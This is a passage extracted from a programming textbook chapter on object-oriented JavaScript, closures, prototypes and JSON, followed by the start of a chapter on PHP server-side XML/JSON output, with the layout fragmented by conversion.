 its objects. We often use objects and classes in our programs to represent real-
 world objects, and types (classes) of objects. For example, we can have classes like 
 Car
 , 
 Customer
 , 
 Document
 , or 
 Person
 , and objects such as 
 myCar
 , 
 customerJoe
 , 
 myWarranty
 , and 
 theBoss
 .
  
 The concept is intuitive—the class represents an archetype (a blueprint or model that 
 instances are based on), and objects are particular 
 instances
  of that model. For example, 
 all 
 Car
  objects will have the same behavior—the ability to change direction, speed, gear, 
 lanes, and so on. Each individual 
 Car
  object will have its own unique set of values at any 
 particular time, called its ""state"". In programming, an object's state is described by its 
 properties
  and 
 fields
 , while its behavior is defined by its 
 methods 
 and 
 events
 .
  
 [
  82 
 ]",NA
Encapsulation,"The communication with an object is done only via its 
 publicinterface
 , which allows 
 you interact with an object without worrying about how that interaction is actually 
 implemented; this is encapsulation. We can say that encapsulation separates 
 implementation from interface. You don't have to know how these objects do their work 
 internally; all you need to know are the features that you can use.
  
 The ""features you can use"" of a class form the 
 publicinterface
  of a class, which is the sum 
 of all its public members. The public members are those members that are visible and can 
 be used by external classes. In a 
 Car
  class, we might find the public methods, 
 turn()
 , 
 stop()
 , and 
 go()
 . Even without knowing how the 
 turn()
  method actually does the work 
 of turning the car, it's easily done by simply calling the 
 turn()
  method.
  
 [
  83 
 ]",NA
Inheritance,"Inheritance allows creating classes that are specialized versions of an existing class. 
  
 For example, assume that you have the 
 Car
  class, which is used to create objects such as 
 myCar
 , 
 johnsCar
 , or 
 davesCar
 . Now, assume that you want to introduce the concept of 
 a supercar, which would have similar functionality to the car, but some extra features as 
 well, such as the capability to fly!
  
 It might seem like the obvious move would be to create a new class named 
  
 SuperCar
 , and use this class to create the necessary objects such as 
 mySuperCar
 , or 
 davesSuperCar
 . But by using this idea, you would have to recreate all of the properties 
 and methods that were common between the 
 Car
  class and the 
 SuperCar 
 class. 
 Wouldn't it be nice if you could just add those properties and methods that apply only to 
 the 
 SuperCar
 ? Well, it's inheritance to the rescue here. Inheritance allows you to create 
 the 
 SuperCar
  class based on the 
 Car
  class, so you don't need to code all the common 
 features once again. Instead, you can create 
 SuperCar
  as a ""child"" of the 
 Car
  class. Just as 
 children inherit the traits of parents, 
 SuperCar
  inherits all the functionality of 
 Car
 . To 
 create the additional features that you want for your 
 SuperCar
 , you create only the new 
 supporting code—such as a method named 
 Fly
 . 
  
 In this scenario, 
 Car
  is the 
 baseclass
  (also referred to as 
 superclass 
 or
  parent
 ), and 
 SuperCar
  is the 
 derived
  class (also referred to as 
 subclass
  or
  child
 ).
  
 Inheritance is a great concept because it encourages code reuse. The potential negative 
 side effect is that inheritance, by its nature, creates an effect known as 
 tight coupling
  
 between the base class and the derived classes. Tight coupling refers to the fact that any 
 changes that are made to a base class are automatically propagated to all the derived 
 classes. For example, if you make a performance improvement in the code of the original 
 Car
  class, that improvement will propagate to 
 SuperCar
  as well. Usually, this can be used 
 to your advantage, but if the inheritance hierarchy isn't wisely designed, such coupling 
 can impose future restrictions on how you can expand or modify your base classes 
 without breaking the functionality of the derived classes (a potentially knotty problem 
 that makes cogitating on your design before you build it a very worthwhile task).
  
 [
  84 
 ]",NA
Polymorphism,"Polymorphism is an advanced OOP feature that allows using objects of different 
 classes when you only know the common base class from which they both derive. 
  
 Polymorphism permits using a base class reference to access objects of that class, or 
 objects of derived classes. Using polymorphism, you can have, for example, a method, 
 that receives as a parameter an object of type 
 Car
 , and when calling that method you 
 supply an object of type 
 SuperCar
  as a parameter. Because 
 SuperCar
  is a specialized 
 version of 
 Car
 , all the public functionality of 
 Car
  is also supported by 
 SuperCar
 , even 
 though the 
 SuperCar
  implementation differs from 
 Car
 . This kind of flexibility gives a 
 great deal of power to an experienced programmer who knows how to take advantage 
 of it.",NA
Object-oriented programming with ,NA,NA
JavaScript,"The current implementation (ECMAScript3) of JavaScript is not a full-fledged 
 Object 
 Oriented Programming Language 
 (
 OOPL
 ). The next JavaScript version, based on 
 ECMAScript4, includes new features (
 classes
 , 
 private members
 , and so on) that bring 
 JavaScript closer to a consecrated OOPL such as C++.
  
 Objects in JavaScript have some particularities. We'll be looking at them, in detail, in the 
 following pages, but here are the highlights:
  
 •
  
 •
  
 •
  
 As JavaScript code is parsed rather than compiled, it's possible to add new 
 members or functions to an object (or even several objects) on the fly. This 
 allows for flexibility when it comes to creating or altering objects.
  
 JavaScript doesn't support the notion of classes as typical OOP languages do. In 
 JavaScript, you create functions that can behave—in many cases—like classes. In 
 a straight method call, you call the function and supply necessary parameters, 
 pretty standard stuff. But you can also create an instance of a function while 
 supplying those parameters as if you were instantiating a class and passing 
 values to its constructor. This is a nice little trick when you need to create 
 several instances of an object.
  
 JavaScript functions are first-class objects—they are regarded as, and can be 
 manipulated like, other data types. So, for example, you can pass functions as 
 parameters to other functions, or even return functions. This concept may be 
 difficult to grasp as it's very different from the way developers normally think of 
 functions or methods, but you'll see that this kind of flexibility is actually darn 
 cool.
  
 [
  85 
 ]",NA
JavaScript objects are dictionaries,"In a classical OOP world, objects are instances of classes. In JavaScript, things are a little 
 different. Objects are nothing more than 
 key/value collections
  (also named 
 dictionaries
  or 
 associate arrays
 ). For programmers from the classic OOP universe, this 
 situation is a bit like having someone rearrange your furniture while you're away on 
 vacation; all of your stuff is still there but not where you expect it! Unlike traditional 
 arrays, where the key is numeric (as in 
 bookNames[5]
 ), the key of an associative array 
 is a string, or another type of object that can be represented as a string. Take a look at 
 the following code snippet where we retrieve the title of a book by specifying a unique 
 string value as the key:
  
 // retrieve the name of the book
  
 bookName = bookNames[""AJAX_PHP""];
  
 The concept is simple indeed. In this case, the key and the value of the 
 bookNames 
 associative array are both strings. This associative array can be represented as a table:
  
 Key 
  
 Value
  
 AJAX_PHP 
 ASP_AJAX 
 SEO_PHP
  
 AJAX and PHP: Building Responsive Web 
 Applications
  
 Microsoft AJAX Library Essentials
  
 Professional Search Engine Optimization 
 with PHP
  
 [
  86 
 ]",NA
JavaScript functions ,"In procedural programming, procedures represent the basic unit for grouping 
 functionality. JavaScript has functions and their purpose is the same.
  
 A simple fact that was highlighted in the previous chapter, but often overlooked, is the 
 key to understanding how objects in JavaScript work: 
 code that doesn't belong to a 
 function is executed when it's read by the JavaScript interpreter, while code that belongs to 
 a function is only executed when that function is called. 
 Take the following JavaScript 
 code from the first exercise of Chapter 2
 , JavaScript and the AJAX Client
 :
  
 // declaring new variables 
  
 var date = new Date(); 
  
 var hour = date.getHours();
  
 // simple conditional output 
  
 if (hour >= 22 && hour <= 5)
  
  
  document.write(""You should go to sleep.""); 
 else
  
  
  document.write(""Hello, world!"");
  
 This code resides in a file named 
 jsdom.js
 , (which is, in turn, referenced from the 
 HTML file 
 jsdom.html
  in the exercise), but it could have been included directly in a 
 <script>
  tag of the HTML file. How it's stored is irrelevant; what does matter is that 
 all that code is executed when the interpreter reads it. If it were included in a function, 
 it would only execute when the function is explicitly called, as in the following 
 example:
  
 // explicit function call 
  
 ShowHelloWorld(); 
  
 // ""Hello, World"" function 
  
 function ShowHelloWorld() 
  
 {
  
  
  // declaring new variables
  
  
  var date = new Date();
  
  
  var hour = date.getHours();
  
  
  // simple conditional output
  
  
  if (hour >= 22 && hour <= 5) 
  
  
  document.write(""You should go to sleep."");
  
 [
  88 
 ]",NA
JavaScript functions are first-class objects ,"In JavaScript, functions are first-class objects. This means that a function is 
  
 regarded as a data type that can be saved in local variables, passed as a parameter, 
 returned from other functions, and so on. For example, when defining a function, you 
 can assign it to a variable, and then call the function through this variable. 
  
 Take this example:
  
 // assigning DisplayGreeting() to the variable ""display"" 
 var display = function DisplayGreeting(hour) 
  
 {
  
  
  if (hour >= 22 || hour <= 5)
  
   
  document.write(""Goodnight, world!"");
  
  
  else
  
   
  document.write(""Hello, world!""); 
  
 } 
  
 // call DisplayGreeting() via the variable ""display"" 
 display(10);
  
 When storing a piece of code as a variable, as in this example, it can make sense to 
 create it as an 
 anonymousfunction
 —which is a function without a name. You do this 
 by simply omitting a function name when creating it:
  
 // displays greeting 
  
 var display = function(hour) 
  
 { 
  
 ...
  
 }
  
 Anonymous functions will come in handy when you need to pass an executable 
 piece of code (that you don't intend to reuse anywhere else) as a parameter to 
 a function.
  
 [
  89 
 ]",NA
Inner functions ,"In JavaScript, a function can be regarded as a named block of code that you can execute, 
 but it can also be used as 
 a data member inside another function
 ; in this case, it is 
 referred to as an 
 inner function
 . In other words, a JavaScript function can contain other 
 functions.
  
 You will recall the 
 ShowHelloWorld()
  function displayed the greeting through:
  
 {
  
  
  ...
  
  
  if (hour >= 22 || hour <= 5)
  
  
  document.write(""Goodnight, world!"");
  
  
  else
  
  
  document.write(""Hello, world!""); 
  
 }
  
 We can easily separate the code that displays the greeting message into a separate 
 function inside 
 ShowHelloWorld()
  and the output remains unchanged:
  
 // explicit function call 
  
 ShowHelloWorld(); 
  
 // define outer ""Hello, World"" function 
  
 function ShowHelloWorld() 
  
 {
  
  
  // declaring new variables
  
  
  var date = new Date();
  
  
  var hour = date.getHours();
  
  
  // call DisplayGreeting supplying the current hour as parameter
  
  DisplayGreeting(hour);
  
  
  // define inner ""display greeting"" function
  
  
  function DisplayGreeting(hour)
  
  
  {
  
  
  if (hour >= 22 || hour <= 5)
  
    
  document.write(""Goodnight, world!"");
  
  
  else
  
    
  document.write(""Hello, world!"");
  
  
  } 
  
 }
  
 We defined a function named 
 DisplayGreeting()
  inside 
 ShowHelloWorld()
 , 
 which displays a greeting message depending on the 
 hour
  parameter it receives. 
  
 The execution rules apply here as well. This new function needs to be called 
 explicitly from its parent function, otherwise it won't be executed.
  
 [
  91 
 ]",NA
Closures ,"You found simplistic definitions for 
 closures
  a bit earlier in this chapter—they are 
 functions that are defined inside functions and use contextual data from the parent 
 functions to execute.
  
  
 You can find a more technically accurate definition of closures at 
  
  
 http://en.wikipedia.org/wiki/Closure_(computer_science)
 .
  
 Closures allow variables and functions that were themselves created inside a function to 
 remain available even after the originating function has finished 
  
 executing. For example, an outer function that creates a local variable and an inner 
 function. The inner function references the local variable of the outer function. A closure 
 is formed when the inner function is referenced outside the outer function (the inner 
 function can be returned by the outer function for example—remember, functions are 
 first-class objects) for later execution. When the outer function finishes its execution, the 
 inner function still lives on having access to the local variable of the outer function.
  
 For a closure, let's take the following example:
  
 // retrieve the DisplayGreeting function 
  
 var funcDisplayGreeting = ShowHelloWorld(); 
 // call the function 
  
 funcDisplayGreeting(); 
  
 // define outer ""Hello, World"" function 
  
 function ShowHelloWorld () 
  
 {
  
  
  // declaring new variables
  
  
  var date = new Date();
  
  
  var hour = date.getHours();
  
  
  // define inner ""display greeting"" function
  
  function DisplayGreeting()
  
  
  {
  
  
  if (hour >= 22 || hour <= 5)
  
    
  document.write(""Goodnight, world!"");
  
  
 else
  
    
  document.write(""Hello, world!"");
  
  
  }
  
  
  // return DisplayGreeting as a closure
  
  
  return DisplayGreeting; 
  
 }
  
 [
  92 
 ]",NA
JavaScript classes,"In the rest of this chapter, we'll learn how to implement features found in ""traditional"" 
 OOP languages, such as C++, Java, and PHP in JavaScript. You'll learn about 
  
 constructors, instance and static methods, properties, private members, and more.",NA
Constructors,"Constructors are one of those OOP features whose implementation in JavaScript is 
 quite different from what you may know from other programming languages (such 
 as PHP).
  
 A 
 constructor
  is a function (inside a class) that is used to initialize the object at 
 creation time. It is automatically called whenever you instantiate an object using the 
 new
  operator. Consider the following example:
  
 var myHelloWorld = new ShowHelloWorld();
  
 Instantiating an object causes all of the code within the function to be run—just as 
 directly calling the function causes its code to run. The following two snippets cause, 
 essentially, the same action except that the second example causes an object to be 
 instantiated and assigns it to the variable 
 myHelloWorld
 .
  
 ShowHelloWorld();
  
 var myHelloWorld = new ShowHelloWorld();
  
 In classic OOP, the constructor is implemented as a special method inside the class that 
 doesn't return anything, and is called automatically when the object is created.
  
  
 In JavaScript, the code of a function that is used as a class, as 
  
  
 above, works as its constructor.
  
 So if the code in a function actually represents a ""class constructor,"" the parameters 
 received by that function are used as constructor parameters.
  
 [
  93 
 ]",NA
Class diagrams,"To help your understanding of the 
 HelloWorld
  class, its class diagram is shown in the 
 following diagram. JavaScript classes, just like PHP classes, can be described visually 
 using class diagrams. There are standards such as 
 Unified Modeling Language
  (
 UML
 ) 
 that can be used to model classes and the relationships between them. While this is not 
 the subject of this book, we thought you'd find it useful to see the visual representation 
 of a few classes. (The diagram in Figure 3-2 was created using Microsoft Visual Studio, 
 but other tools would generate similar output.)
  
 Figure 3-2: HelloWorld class diagram
  
 In such diagrams, the constructor is the method which has the same name as the class—
 in this case, 
 HelloWorld
 . The input parameter of the constructor is 
 hour
 , which is 
 defined as an 
 int
  (integer) value in the diagram. You can also see the 
 hour 
 field of the 
 class, and the 
 DisplayGreeting()
  method has no input parameters and returns no 
 values (it returns 
 void
 ). The exact notations can vary, but as soon as you get used to a 
 notation style, you can use such diagrams when designing your code.
  
 It's good to note that JavaScript doesn't support specifying data types for variables or 
 class fields. The data type of the field makes the diagram helpful in specifying the 
 intended purpose and type of the field, but that type isn't used in the actual 
 implementation of the class.
  
 [
  95 
 ]",NA
Referencing external functions ,"Instead of defining member functions (methods) inside the main function (class) as 
 previously shown, you can define the function outside of the class and reference it 
 instead:
  
 function Table (rows, columns) 
  
 {
  
  
  // ""constructor""
  
  
  this.rows = rows;
  
  
  this.columns = columns;
  
  
  // getCellCount ""method""
  
  
  this.getCellCount = getCellCount; 
  
 } 
  
 // returns the number of cells 
  
 function getCellCount() 
  
 {
  
  
  return this.rows * this.columns; 
  
 }
  
 [
  97 
 ]",NA
Prototype objects,"You just learned how you can define ""class methods"" outside the body of a ""class"" in 
 order to prevent creating multiple copies of methods for each instantiated object. In 
 JavaScript, there is another feature that you can use to achieve this functionality—
 prototyping.
  
 Prototyping
  is a JavaScript language feature that allows attaching or assigning 
 methods to the ""blueprint"" of a function. When methods are added to a class 
 (function) prototype, they are not replicated for each object (instance) of the 
 class. Methods and properties added via prototyping are immediately shared with 
 every instance of the originating class.
  
 The following are a few facts that you should keep in mind about prototypes:
  
 •
  
 •
  
 •
  
 •
  
 •
  
 •
  
 Every JavaScript function has a 
 prototype
  property, which is itself an object. 
 To add members to the function's prototype, you add them to the 
 prototype 
 property of the function.
  
 Each prototype object has a 
 constructor
  property which points to the 
 constructor function.
  
 Constructor functions and variables are not accessible through functions 
 added to its prototype.
  
 Adding a new member to the prototype object makes it immediately 
 available to all objects—even those already in existence.
  
 You can add members to a function's prototype only after the function itself 
 has been defined.
  
 The 
 Table
  ""class"" from the previous example contains a ""method"" named 
 getCellCount()
 . The following code creates the same class, but this time adding 
 getCellCount()
  to its prototype:
  
 // Table class
  
 function Table (rows, columns)
  
 {
  
  // constructor
  
  this.rows = rows;
  
  this.columns = columns;
  
 }
  
 // Table.getCellCount returns the number of table cells
  
 [
  98 
 ]",NA
Instance methods and properties ,"Methods and properties that are specific to a particular instance of a class are named 
 instance methods and properties.
  
 We defined the 
 Table
  class and made use of the 
 prototype
  object. We declared two 
 properties (
 rows
  and 
 columns
 ) utilizing the keyword 
 this
 . We know that each instance 
 will have its own copies of its properties and that the 
 getCellCount() 
 method will be 
 shared among all the instances as it is added to the 
 prototype
  object.
  
 Now we've added the declaration of two instances of the class and the code to 
 display the cell counts of each instance:
  
 // Table class 
  
 function Table (rows, columns) 
  
 {
  
  
  // save parameter values to class properties
  
  
  this.rows = rows;
  
  
  this.columns = columns; 
  
 } 
  
 // Table.getCellCount returns the number of table cells 
  
 Table.prototype.getCellCount = function() 
  
 {
  
  
  return this.rows * this.columns; 
  
 }; 
  
 var t1 = new Table(2,3); 
  
 var t2 = new Table(3,5); 
  
 // display the number of cells of the first table (6 cells) 
 alert(t1.getCellCount()); 
  
 // display the number of cell from the second table (15 
 cells) alert(t2.getCellCount());
  
 [
  99 
 ]",NA
Static methods and properties ,"It is quite common to have methods and properties that are tied to an entire class 
 instead of a single instance.
  
 Let's modify our example by creating a static method that creates a square table 
 with a size given by a static property 
 SQUARESIZE
 :
  
 // Table class 
  
 function Table (rows, columns) 
  
 {
  
  
  // save parameter values to class properties
  
  
  this.rows = rows;
  
  
  this.columns = columns; 
  
 } 
  
 // Table.getCellCount returns the number of table cells 
 Table.prototype.getCellCount = function()
  
 [
  100 
 ]",NA
Private members ,"We've already seen that JavaScript varies from classic OOP in some interesting 
 ways—for some of us, this takes a little getting used to—don't worry, sheer 
 repetition will get you through and soon it will seem second nature! With that in 
 mind, let's talk about another ""deviation"" from traditional OOP.
  
 JavaScript doesn't support the notion of private members as do classic OO 
  
 programming languages, but you can simulate the functionality by using variables 
 inside a function. Variables are declared with the 
 var
  keyword or are received as 
 function parameters. They aren't accessed using 
 this
 , and they aren't accessible 
 through function instances, thus acting like private members. Variables can, however, 
 be accessed by closure functions.
  
 If you want to test this, modify the 
 Table
  function as shown in the following code:
  
 function Table (rows, columns) 
  
 {
  
  
  // save parameter values to local variables
  
  var _rows = rows;
  
  
  var _columns = columns;
  
  
  // return the number of table cells
  
  
  this.getCellCount = function()
  
  
  {
  
  
  return _rows * _columns;
  
  
  }; 
  
 }
  
 [
  101 
 ]",NA
The JavaScript execution context,"In this section, we'll take a peek under the hood of the JavaScript closures and the 
 mechanisms that allow us to create classes, objects, and object members in JavaScript.
  
  
 In most cases, understanding these mechanisms isn't absolutely 
  
  
 necessary for writing JavaScript code—so you can skip it if it sounds 
  
 too advanced. If you are interested in learning more about 
  
 the JavaScript parser's inner workings, see the more advanced article at 
  
 http://www.jibbering.com/faq/faq_notes/closures.html
 .
  
 [
  102 
 ]",NA
"var x, this.x, and x ","An execution context contains a collection of associations (key, value) representing the 
 local variables and functions, a prototype whose members can be accessed through the 
 keyword 
 this
 , a collection of function parameters (if the context was created for a 
 function call), and information about the context of the calling code.
  
 Members accessed through 
 this
 , and those declared using 
 var
 , are stored in separate 
 places, except in the case of the global execution context where variables and properties 
 are the same thing. In objects, variables declared through 
 var
  are not accessible through 
 function instances, which makes them perfect for implementing private ""class"" 
 members, as you saw earlier. On the other hand, members accessed through 
 this
  are 
 accessible through function instances, so we can use them to implement public 
 members.
  
 When a member is read using its literal name, its value is first searched for in the list 
 of local variables. If it's not found there, it is searched for in the prototype. 
  
 To understand the implications, see the following function, which defines a local 
 variable 
 x
 , and a property named 
 x
 . If you execute the function, you'll see that the value 
 of 
 x
  is read from the local variable, even though you have a property with the same 
 name:
  
 function BigTest() 
  
 {
  
  
  var x = 1;
  
  
  this.x = 2;
  
  
  document.write(x); // displays ""1"" (local variable)
  
  document.write(this.x); // displays ""2"" (property) 
 }
  
 [
  104 
 ]",NA
Using the right context,"So why are we telling you all of this? Well, when working with JavaScript functions and 
 objects, you need to make sure the code executes in the context it was intended for, 
 otherwise you may get unpredictable results (interesting and compelling in say, 
 chemistry, but a major ""groaner"" for programmers). You saw earlier that the same code 
 could have different output depending on where it's executing—inside a function or in 
 the global context.
  
 Things get a little more complicated when using the keyword 
 this
 . As you know, each 
 function call creates a new context in which the code executes. When the context is 
 created, the value of 
 this
  is also decided:
  
 •
  
 •
  
 When an object is created from a function, 
 this
  refers to that object
  
 In the case of a simple function call, regardless of whether the function is 
 defined directly in the global context or in another function or object, 
 this 
 refers to the global context
  
 The second point is particularly important. In a function meant to be called directly 
 rather than instantiated as an object, using 
 this
  is a bad programming practice, 
 because you end up altering the global object.
  
 Take this example that shows how you can overwrite a global variable from within a 
 function:
  
 x = 0; // declare global variable
  
 document.write(x); // displays ""0""
  
 function BigTest()
  
 {
  
  this.x = 1; // modifies variable in global context
  
 }
  
 [
  105 
 ]",NA
JavaScript OOP in practice: Introducing ,NA,NA
JSON,"In AJAX applications, client/server communication is usually packed in XML documents, 
 or in the 
 JSON
  (
 JavaScriptObjectNotation
 ) format. Interestingly enough, JSON's 
 popularity increased together with the AJAX phenomenon. Starting with version 5.2.0, 
 PHP includes the most necessary JSON functions in the language itself rather than an 
 external library. However, if a PHP version does not include the necessary set of 
 functions, we have the option of implementing JSON functions in an external library.
  
 Perhaps the best short description of JSON is the one proposed by its official 
 website, 
 http://www.json.org
 : 
  
 JSON (JavaScript Object Notation) is a lightweight data-interchange format. It is 
 easy for humans to read and write. It is easy for machines to parse and generate.
  
 If you're new to JSON, you might ask a fair question, 
 Yet another data exchange format, 
 but why?
  JSON, like XML, is a text-based format that's easy to write and easy to 
 understand for both humans and computers. The key word in the definition above is 
 ""lightweight"". JSON data structures occupy less bandwidth than their XML versions.
  
 To get an idea of how JSON compares to XML, let's take the same data structure and see 
 how we would represent it using both standards:
  
 <?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>
  
 <response>
  
  <clear>false</clear>
  
  <messages>
  
  <message>
  
  <id>1</id>
  
 [
  107 
 ]",NA
JSON concepts,"JSON is said to be a subset of JavaScript because it's based on the associative array 
 (key/value or dictionary) nature of JavaScript objects—remember, at the beginning of 
 this chapter, you learned that every JavaScript object is a dictionary!
  
 JSON is based on two basic structures:
  
 •
  
 •
  
 Object
 : This is defined as a collection of name/value pairs. Each object begins 
 with a left curly bracket (
 {
 ) and ends with a right curly bracket (
 }
 ). A colon 
 separates the name/value pairs (
 name:value)
 .
  
 Array
 : This is defined as a list of values separated by a comma (
 ,
 ). The array 
 begins with a left square bracket (
 [
 ) and ends with a right square bracket (
 ]
 ).
  
 We should also mention strings and values. A 
 value
  can be a string, a number, an 
 object, an array, true or false, or null. A 
 string
  is a collection of Unicode characters 
 surrounded by double quotes. For escaping, we use the backslash '
 \
 ' character.
  
 It's obvious that if you plan to use JSON, you need to be able to parse and generate JSON 
 structures in both JavaScript and PHP—at least if communication is 
  
 bidirectional. JSON libraries are available for most of today's programming languages. 
  
 In the exercise that follows, you'll see how to read JSON data using JavaScript, and 
 later in the book, you'll learn how to create JSON structures with PHP.
  
 If you plan to work with JSON data outside of PHP, you can use the library listed at 
 http://www.json.org/js.html
 . Here you can also find an excellent visual 
 description of what JSON structures are made of.",NA
A simple JSON example,"We'll conclude this chapter by translating the XML example from Chapter 2, which was 
 created using XML, to use JSON. In Chapter 2, 
 JavaScript and the AJAX Client
 , we used three 
 files: 
 books.html
 , 
 books.js
 , and 
 books.html
  (if you can't recall the exercise, have a 
 look at the screenshot in the 
 Time for action—making asynchronous calls with 
 XMLHttpRequest and XML
  section of Chapter 2). 
  
 In this new exercise, the file we're reading from the server is named 
 books.txt
  and it is 
 the JSON equivalent of 
 books.xml
  from Chapter 2.
  
 Let's see how to read this structure using JavaScript code and show the list of books to 
 our visitor.
  
 [
  109 
 ]",NA
Time for action – using JSON ,"1. In the 
 oop
  folder, create a subfolder called 
 json
 .
  
 2. In the 
 json
  folder, create a file called 
 books.txt
 , and add the structure 
  
 content to the file:
  
 {books:[
  
  {title:""AJAX and PHP: Building Modern Web Applications, 2nd Ed"",
  
  isbn:""978-1904817726""},
  
  {title:""Beginning PHP and MySQL E-Commerce, 2nd Edition"",
  
  
  isbn:""978-1590598641""},
  
  {title:""Professional Search Engine Optimization with PHP"",
  
  
 isbn:""978-0470100929""} 
  
 ]}
  
 3. In the same folder, create a file called 
 books.html
 , where you should copy 
  
 the contents of 
 books.html
  from Chapter 2. (Remember you can also use the 
  
 code download.) 
  
 4. Finally, create the 
 books.js
  file, which is, again, mostly the same as the one 
  
 from Chapter 2. The differences from the Chapter 2 version are highlighted: 
  
 // holds an instance of XMLHttpRequest 
  
  
 var xmlHttp = createXmlHttpRequestObject(); 
  
  
 // creates an XMLHttpRequest instance 
  
  
 function createXmlHttpRequestObject() 
  
  
 { 
  
  
 // ... same old function 
  
  
 } 
  
  
 // read a file from the server 
  
  
 function process() 
  
  
 {
  
  
  
  // only continue if xmlHttp isn't void
  
  
  
  if (xmlHttp)
  
  
  
  {
  
  
  
  // try to connect to the server
  
  
  
  try
  
  
  
  {
  
 [
  110 
 ]",NA
Summary,"In this chapter, we covered a large area of what object-oriented programming means in 
 the world of JavaScript, starting from basic features and going far into the execution 
 context of functions. Working with OOP in JavaScript is certainly no easy task, especially 
 if you haven't been exposed to the implied concepts previously. Where you don't feel 
 confident enough, have a look at the additional resources that we've referenced.
  
 [
  112 
 ]",NA
Using PHP and MySQL on ,NA,NA
the Server,"AJAX is mainly about building smart web clients, but the servers that the client talks to 
 must be equally smart or their conversation will be quite one-sided. 
  
 So far, we've only talked about clients reading static text, JSON, or XML files from the 
 server. In this chapter, we start putting the server to work, using PHP to generate 
 dynamic output, and MySQL to manipulate and store the backend data. In this chapter, 
 you will learn how to:
  
 •
  
 •
  
 •
  
 Use XML and JSON with PHP, so that you can create server-side code that 
 communicates with your JavaScript client 
  
 Implement error-handling code in your server-side PHP code 
  
 Work with MySQL databases",NA
"PHP, DOM, and XML","To begin understanding the server-side techniques and principles used in AJAX, in the 
 first exercise of this chapter, you'll create a PHP script that uses PHP's DOM functions 
 to dynamically create XML output, which is then read by the client.
  
 Remember that we assume you have basic knowledge of PHP. If you need additional 
 assistance with the PHP code, we recommend you google ""php tutorial"", which will lead 
 you to lots of interesting resources, including the official PHP tutorial at 
 http://php.net/tut.php
 . If you enjoy learning by practice, check out Cristian Darie's 
 PHP e-commerce books, such as 
 Beginning PHP and MySQL E-Commerce: From Novice to 
 Professional, Second Edition
 .",NA
Time for action – server-side AJAX with PHP and XML ,"1. In the 
 ajax
  folder, create a subfolder called 
 php
 .
  
 2. In the 
 php
  folder, create a file named 
 phptest.html
 , and add the following 
  
 text in it:
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.1//EN"" ""http://www.
  
 w3.org/TR/xhtml11/DTD/xhtml11.dtd""> 
  
 <html xmlns=""http://www.w3.org/1999/xhtml"">
  
 [
  114 
 ]",NA
What just happened?,"When it comes to generating XML structures, not only on the client side but on the 
 server side as well, you have to choose between creating the XML document using the 
 DOM, or by joining strings. Your PHP script, 
 phptest.php
 , starts by setting the content 
 output to 
 text/xml
 :
  
 <?php
  
 // set the output content type as xml
  
 header('Content-Type: text/xml');
  
 If you want more familiarity with PHP headers, the documentation can be found at 
 http://www.php.net/manual/en/function.header.php
 .
  
  
 In JavaScript files we use double quotes for strings, in PHP we will always 
  
  
 try to use single quotes. They are processed faster, are more secure and 
  
 they are less likely to cause programming errors. Learn more about PHP 
  
 strings at 
 http://php.net/types.string
 .
  
 The PHP DOM, not very surprisingly, looks a lot like the JavaScript DOM (isn't that 
 handy?). It all begins by creating a DOM document object, which in PHP is 
 represented by the 
 DOMDocument
  class:
  
 // create the new XML document
  
 $dom = new DOMDocument();
  
 [
  118 
 ]",NA
PHP and JSON ,"In the previous chapter, we only scratched the surface of JSON. As we've previously 
 seen, using JSON reduces the amount of data sent through the wire—so it's certainly 
 worth learning and utilizing. You probably remember that JSON's format isn't that 
 different from XML's. Take a look at obtaining the same result as above, using JSON:
  
 [""response"":
  
  
  {""books"":
  
  
  [    
  
     
  {""title"":""AJAX and PHP: Building Modern Web Applications,  
       
  2nd Ed"",
  
      
  ""isbn"":""978-1904817726""
  
   
  }    
  
 [
  119 
 ]",NA
Time for action – server-side AJAX with PHP and JSON,"1. Download 
 http://www.json.org/json2.js
  to your 
 ajax/php
  folder.
  
 2. Edit the 
 phptest.html
  file that you've created earlier by adding a reference 
  
 to 
 json2.js
 :
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.1//EN"" ""http://www. 
 w3.org/TR/xhtml11/DTD/xhtml11.dtd"">
  
 <html xmlns=""http://www.w3.org/1999/xhtml"">
  
  <head>
  
  <title>AJAX Foundations: Using JSON with PHP</title>
  
  <script type=""text/javascript"" src=""phptest.js""></script>
  
  <script type=""text/javascript"" src=""json2.js""></script>
  
 [
  120 
 ]",NA
What just happened?,"Modifying the code in order to use JSON was blissfully easy, wasn't it? We had to 
 reference the JavaScript JSON library in order to be able to work with it properly.
  
  <script type=""text/javascript"" src=""json2.js""></script>
  
  
 We might have just used 
 eval()
  to get the object from the XMLHttp 
  
  
 response, as we did in the final exercise of Chapter 3, but that would have 
  
 possibly lead to security issues. For more information about the security 
  
 issues with 
 eval()
 , you can check 
 http://www.json.org/js.html
 .
  
 The server-side code now looks simpler too. We simply structure the information we 
 want to send using arrays, and then we use the 
 json_encode()
  function to generate the 
 JSON string. The 
 encode
  and 
 decode
  methods allow us to encode a PHP object into JSON 
 format and to decode a JSON string into a PHP object.
  
 The JavaScript used for parsing the data has also been simplified. Using the JSON 
 library, we parse the response from the server and generate the JSON object.
  
  // read the message from the server
  
  responseJSON = JSON.parse(xmlHttp.responseText);   
  
 [
  122 
 ]",NA
Passing parameters and handling PHP ,NA,NA
errors,"The previous exercise with PHP ignores two very common aspects of writing PHP 
 scripts: 
  
 •
  
 •
  
 You usually need to send parameters to your server-side (PHP) script. The client 
 side is quite well protected, but we need to implement some error-handling on 
 the server side as well.
  
 You can send parameters to the PHP script using either 
 GET
  or 
 POST
 . Handling PHP 
 errors is done with a PHP-specific technique. In the following exercise, you will pass 
 parameters to a PHP script, and implement an error-handling mechanism that you will 
 test by supplying bogus values. The application will look as shown in the screenshot that 
 will follow shortly.
  
 The page will make an asynchronous call to a server to divide two numbers. The 
 server, when everything works well, will return the result as an XML structure that 
 looks like this:
  
 <?xml version=""1.0""?>
  
 <response>1.5</response>
  
 In the case of a PHP error, the server script returns a plain text error message (instead of 
 generating an XML string). Because few things are as annoying or less helpful as 
 indecipherable, geeky error messages, ours will be intercepted by the client so we can 
 have a chance to change it into a friendly, easy-to-understand message. 
  
 [
  123 
 ]",NA
Time for action – passing PHP parameters and ,NA,NA
error handling ,"1. In the 
 ajax/php
  folder, create a new folder called 
 errhandling
 .
  
 2. In the 
 errhandling
  folder, create a file named 
 divide.html
  and type the 
 following code in it (don't worry if all the code isn't clear just yet, we'll be 
 taking a good look at it in a moment):
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.1//EN"" ""http://www.
  
